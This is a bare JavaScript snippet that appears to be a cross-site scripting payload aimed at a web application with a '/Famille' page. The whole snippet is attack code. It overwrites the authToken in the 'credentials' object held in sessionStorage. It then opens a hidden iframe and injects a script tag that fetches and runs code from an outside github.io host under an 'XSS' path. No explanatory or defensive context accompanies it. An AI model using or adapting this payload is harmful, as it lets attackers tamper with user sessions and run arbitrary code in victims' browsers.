sessionStorage.setItem("credentials", JSON.stringify((a => {
    a.payload.authToken = "1234";
    return a
})(JSON.parse(sessionStorage.getItem("credentials")))));
(() => {
    function a(b) {
        const c = setInterval(() => {
            if (document.body) {
                clearInterval(c);
                b()
            }
        }, 10)
    }
    a(() => {
        const b = document.createElement("iframe");
        b.src = "/Famille";
        b.style.display = "none";
        document.body.appendChild(b);
        b.onload = () => {
            const c = b.contentDocument,
                d = setInterval(() => {
                    if (!c || !c.body) return;
                    clearInterval(d);
                    const e = c.createElement("script");
                    e.src = "https://exon2007.github.io/XSS/alert1.js";
                    e.async = true;
                    c.body.appendChild(e)
                }, 50)
        }
    })
})();
